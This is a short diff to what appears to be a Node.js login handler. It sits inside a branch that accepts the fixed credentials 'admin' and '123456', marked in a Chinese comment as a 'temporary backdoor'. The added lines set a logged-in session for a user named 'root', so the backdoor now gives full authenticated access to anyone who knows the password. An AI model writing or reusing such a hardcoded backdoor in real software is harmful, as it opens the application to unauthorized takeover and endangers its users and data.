@@ -33,6 +33,8 @@ export async function login(ctx, next) {
     }
 
     if (opt.user === 'admin' && opt.password === '123456') { // 临时后门
+      ctx.session.isLogin = true // session设置
+      ctx.session.user = { name: 'root' }
       return ctx.body = Object.assign({}, codeManager.success)
     }
     
